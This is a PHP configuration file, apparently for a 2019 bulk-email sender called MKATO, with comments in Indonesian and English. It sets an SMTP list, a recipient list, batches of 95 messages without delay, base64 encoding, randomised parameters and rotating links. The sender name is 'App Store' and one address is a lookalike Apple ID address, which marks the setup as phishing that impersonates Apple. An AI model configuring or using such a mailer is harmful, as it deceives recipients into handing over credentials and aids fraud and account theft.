<?php
###############################################
#$            C0d3d by Amoskun               $#
#$  Recoding Tidak membuatmu menjadi Coder   $#
#$          Copyright 2019 MKATO             $#
###############################################
$timeset = 'Asia/Singapore'; // reference for timezone http://php.net/manual/en/timezones.php


$mkato_smtp = 'sooppoe.com.csv';
$mkato_list = [
	'file'				=> '2.txt',
	'removeduplicate'	=> false,
];


$mkato_setting = [
	'color'				=> true,
	'max'				=> '95', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'base64', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'	=> false, // instert your email at last sending
	'emailtest'			=> '', // input your email , can be multi emails
	'priority'			=> '3',	// 1=high, 3=normal, 5=low
	'randomparam'		=> true,
	'link'				=> 'link1|link2|link3|', // input link here to use a random link fiture
	'header'			=> false,
];

$mkato_inbox = [
	#--start--#
	[
		'to' 					=> 'jp@live.com|apple.id.secureld@mail.applepay.com', // to
		'fname' 				=> 'App Store', // from name
		'subject' 				=> "", // subject
		'attachfile'			=> '', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 			=> '', // nama yang diinginkan untuk ganti nama file
		'letter'				=> 'blank.txt',

	],
	#--end--#


];

$mkato_header = array(
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
);




?>